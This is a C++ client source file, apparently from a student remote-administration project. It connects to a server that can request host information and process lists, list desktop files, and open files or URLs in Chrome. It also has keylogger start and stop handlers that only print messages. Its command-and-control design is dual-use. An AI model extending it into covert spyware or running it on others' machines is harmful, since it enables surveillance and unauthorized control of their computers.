#include "LPTF_Client.h"
#include "SystemCommand.h"

LPTF_Client::LPTF_Client(const string &ip, int port)
{
    if (!socket.create())
    {
        throw runtime_error("Socket creation failed");
    }
    if (!socket.connect(ip.c_str(), port))
    {
        throw runtime_error("Connection failed");
    }
    cout << endl
         << "Connected to server ||  Ip : " << ip << " || Port : " << to_string(port) << endl;
    cout << "Enter a message (or \"exit\")\n\n";
}

LPTF_Client::~LPTF_Client()
{
    socket.close();
}

void LPTF_Client::sendPacketFromString(const string &message, CommandType type)
{
    vector<uint8_t> payload(message.begin(), message.end());
    LPTF_Packet packet(static_cast<uint8_t>(type), payload);
    auto serialized = packet.serialize();
    if (!socket.sendAll(serialized.data(), serialized.size()))
    {
        cerr << "Error: Failed to send the full packet." << endl;
    }
}

bool LPTF_Client::receivePacketAndPrint()
{
    uint8_t header[2];
    if (!socket.receiveAllPackets(header, 2))
    {
        cerr << "Error: Failed to receive packet header." << endl;
        return false;
    }

    uint16_t packetSize = (header[0] << 8) | header[1];
    if (packetSize < 3)
    {
        cerr << "Error: Invalid packet size." << endl;
        return false;
    }

    vector<uint8_t> data(packetSize);
    data[0] = header[0];
    data[1] = header[1];

    if (!socket.receiveAllPackets(data.data() + 2, packetSize - 2))
    {
        cerr << "Error: Failed to receive the full packet." << endl;
        return false;
    }
    try
    {
        LPTF_Packet packet = LPTF_Packet::deserialize(data);
        handleCommand(packet);
    }
    catch (const exception &e)
    {
        cerr << "Error: Deserialization failed - " << e.what() << endl;
        return false;
    }
    return true;
}

void LPTF_Client::sendProcessList()
{
    ProcessManager pm;
    vector<vector<string>> processes = pm.getRunningProcesses();
    sendPacketFromTable(processes, CommandType::PROCESS_LIST_RESPONSE);
}

void LPTF_Client::run()
{
    while (true)
    {
        fd_set readfds;
        FD_ZERO(&readfds);
        FD_SET(socket.get_fd(), &readfds);
        SOCKET max_fd = socket.get_fd();

        timeval timeout{};
        timeout.tv_sec = 0;
        timeout.tv_usec = 0;

        int activity = select(0, &readfds, nullptr, nullptr, &timeout);
        if (activity > 0 && FD_ISSET(socket.get_fd(), &readfds))
        {
            if (!receivePacketAndPrint())
            {
                cerr << "[Client] : Connection closed or failed during read.\n";
                break;
            }
        }

        if (_kbhit())
        {
            cout << "[Client] : ";
            string input;
            getline(cin, input);

            if (input == "exit")
                break;
            sendPacketFromString(input, CommandType::SEND_MESSAGE);
        }
        this_thread::sleep_for(chrono::milliseconds(50));
    }
}

void LPTF_Client::handleCommand(const LPTF_Packet &packet)
{
    string payload(packet.getPayload().begin(), packet.getPayload().end());
    CommandType type = static_cast<CommandType>(packet.getType());

    switch (type)
    {
    case CommandType::HOST_INFO_REQUEST:
    {
        string info = SystemInfo::getAllInfo();
        sendPacketFromString(info, CommandType::HOST_INFO_RESPONSE);
        break;
    }

    case CommandType::START_KEYLOGGER_REQUEST:
    {
        cout << "[Client] : Starting keylogger..." << endl;
        break;
    }

    case CommandType::STOP_KEYLOGGER_REQUEST:
    {
        cout << "[Client] : Stopping keylogger..." << endl;
        break;
    }
    case CommandType::LIST_PROCESSES_REQUEST:
    {
        sendProcessList();
        break;
    }
    case CommandType::EXECUTE_COMMAND_REQUEST:
    {
        const string commandPrefix = "opendesktop_file ";
        const string url_Prefix = "open_url ";
        if (payload == "list_desktop_files")
        {
            cout << payload << endl;
            SystemCommand sysCmd;
            string result = sysCmd.listDesktopFiles();
            sendPacketFromString(result, CommandType::COMMAND_RESULT_RESPONSE);
        }
        else if (payload == "create_test_file")
        {
            SystemCommand sysCmd;
            string result = sysCmd.createAndOpenTextFileOnDesktop("conjonction de coordination.txt", "Conjonction de coordination:\n Mais ou est donc \npassé la gourde d'Alicia ?");
            sendPacketFromString(result, CommandType::COMMAND_RESULT_RESPONSE);
        }
        else if (payload.compare(0, commandPrefix.length(), commandPrefix) == 0)
        {
            string filename = payload.substr(commandPrefix.length());
            SystemCommand sysCmd;
            bool success = sysCmd.openFileOnDesktop(filename);
            string result = success ? "File opened successfully." : "Error: Failed to open file.";
            sendPacketFromString(result, CommandType::COMMAND_RESULT_RESPONSE);
        }
        else if (payload.compare(0, url_Prefix.length(), url_Prefix) == 0)
        {
            string url = payload.substr(url_Prefix.length());
            SystemCommand sysCmd;
            bool success = sysCmd.openURLInChrome(url);
            string result = success ? "Url opened successfully." : "Error: Failed to open Chrome/url.";
            sendPacketFromString(result, CommandType::COMMAND_RESULT_RESPONSE);
        }
        else
        {
            cerr << "[Client] : Unknown command received: " << payload << endl;
            return;
        }
        break;
    }
    case CommandType::SEND_MESSAGE:
    {
        cout << "[Server Message] : " << payload << endl;
        break;
    }
    default:
    {
        cerr << "[Client] : Unknown command type received: " << static_cast<int>(packet.getType()) << endl;
        break;
    }
    }
}

void LPTF_Client::sendPacketFromTable(const vector<vector<string>> &table, CommandType type)
{
    vector<uint8_t> payload;

    uint32_t rowCount = static_cast<uint32_t>(table.size());
    payload.insert(payload.end(), reinterpret_cast<uint8_t *>(&rowCount), reinterpret_cast<uint8_t *>(&rowCount) + sizeof(rowCount));

    for (const auto &row : table)
    {
        uint32_t colCount = static_cast<uint32_t>(row.size());
        payload.insert(payload.end(), reinterpret_cast<uint8_t *>(&colCount), reinterpret_cast<uint8_t *>(&colCount) + sizeof(colCount));

        for (const auto &cell : row)
        {
            uint32_t strLen = static_cast<uint32_t>(cell.size());
            payload.insert(payload.end(), reinterpret_cast<uint8_t *>(&strLen), reinterpret_cast<uint8_t *>(&strLen) + sizeof(strLen));
            payload.insert(payload.end(), cell.begin(), cell.end());
        }
    }

    LPTF_Packet packet(static_cast<uint8_t>(type), payload);
    auto serialized = packet.serialize();
    if (!socket.sendAll(serialized.data(), serialized.size()))
    {
        cerr << "Error: Failed to send the full packet." << endl;
    }
}
